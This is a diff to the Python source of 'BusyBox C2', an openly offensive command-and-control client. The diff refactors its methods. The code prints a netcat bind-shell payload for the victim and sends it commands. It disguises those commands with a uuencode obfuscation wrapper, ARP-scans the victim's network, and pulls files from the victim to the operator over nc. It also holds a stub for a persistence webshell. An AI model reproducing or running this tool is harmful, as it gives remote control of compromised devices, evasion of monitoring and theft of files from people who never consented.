@@ -7,20 +7,27 @@ import threading
 
 class BusyBoxC2:
     def __init__(self, server_ip, server_port):
+
+        # Init app variables
         self.server_ip = server_ip
         self.server_port = server_port
         self.prompt = " (busybox-c2)> "
         self.options = []
 
-        self.show_banner()
+        # Show banner
+        self._show_banner()
 
+        # Show payload to send
         payload = "busybox nc -lp " + str(server_port) + " -e ash"
         print(f"[*] Payload to execute: {payload}\n")
 
         # Init socket
-        self.socket = self.init_socket()
+        self.socket = self._init_socket()
 
-    def init_socket(self):
+    def _show_banner(self):
+        print(Figlet(font="slant").renderText("BusyBox C2"))
+
+    def _init_socket(self):
         print(f"[...] Initialization of TCP connection to {self.server_ip}:{self.server_port}")
         while True:
             try:
@@ -35,12 +42,18 @@ class BusyBoxC2:
         self.socket.setblocking(False)
         return self.socket
 
-    def show_banner(self):
-        print(Figlet(font="slant").renderText("BusyBox C2"))
+    def _send_cmd(self, cmd):
 
-    def send_cmd(self, cmd):
+        # Add marker to know when command execution is terminated
         marker = "__END_OF_CMD_{}__".format(int(time.time()*1000))
         full_cmd = cmd + " ; echo " + marker
+
+        # Obfuscate full cmd if necessary
+        if "obfuscation_ascii" in self.options:
+            full_cmd = self._cmd_obfuscation_ascii(full_cmd)
+            print(f"Executed command: {full_cmd}\n")
+
+        # Send payload and wait marker in response to stop reading socket
         self.socket.sendall((full_cmd + "\n").encode())
         buf = bytearray()
         printed = 0
@@ -72,30 +85,30 @@ class BusyBoxC2:
             else:
                 continue
 
-    def cmd_obfuscation_ascii(self, raw_cmd):
+    def _cmd_obfuscation_ascii(self, raw_cmd):
         cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
         ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
         payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode -o /dev/stdout|ash"
         return payload
 
-    def discover_arp_scan():
+    def _discover_arp_scan(self):
         net_ip = input("Network IP (ex: 192.168.1.0): ")
         range = input("Range (max: 254): ")
 
-        cmd = "for i in $(seq 1 " + range + "); do arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"
-        return cmd
+        cmd = "for i in $(seq 1 " + range + "); do sudo arping -c 1 -w 0 " + net_ip[:-1] + "$i >/dev/null 2>&1 && echo \"[+]" + net_ip[:-1] + "$i\"; done"
 
-    def download(self):
+        print("[*] Start scanning...")
+        self._send_cmd(cmd)
+        print("[*] Scan ended")
+
+    def _download(self):
         file_name = input("File to download: ")
         listening_port = random.randint(1024, 65534)
         listener_cmd = "nc -lp " + str(listening_port) + " > " + file_name
 
-        # Send command to get the file with a delay to wait sevrer availability
+        # Send command to get the file with a delay to wait server availability
         cmd = "sleep 0.5; nc " + self.server_ip + " " + str(listening_port) + " < " + file_name
-        if "obfuscation_ascii" in self.options:
-            cmd = self.cmd_obfuscation_ascii(cmd)
-        self.send_cmd(cmd)
-        t = threading.Thread(target=self.send_cmd, args=(cmd,))
+        t = threading.Thread(target=self._send_cmd, args=(cmd,))
         t.start()
 
         # Launch listener to receive file
@@ -122,23 +135,14 @@ class BusyBoxC2:
                             self.options.append('obfuscation_ascii')
                             self.prompt = " (busybox-c2)[+]> "
                         case '/scan_discover':
-                            cmd = self.discover_arp_scan()
-                            if "obfuscation_ascii" in self.options:
-                                cmd = self.cmd_obfuscation_ascii(cmd)
-                            self.send_cmd(cmd)
+                            self._discover_arp_scan()
                         case '/download':
-                            # use netcat
-                            self.download()
+                            self._download()
                         case '/persistence_webshell':
                             # launch web server and drop pwnyshell
                             pass
                         case _:
-                            if "obfuscation_ascii" in self.options:
-                                cmd = self.cmd_obfuscation_ascii(cmd)
-                                print(f"Executed command: {cmd}\n")
-                                #break
-
-                            self.send_cmd(cmd)
+                            self._send_cmd(cmd)
                 except (EOFError, KeyboardInterrupt):
                     break
                 if not cmd:
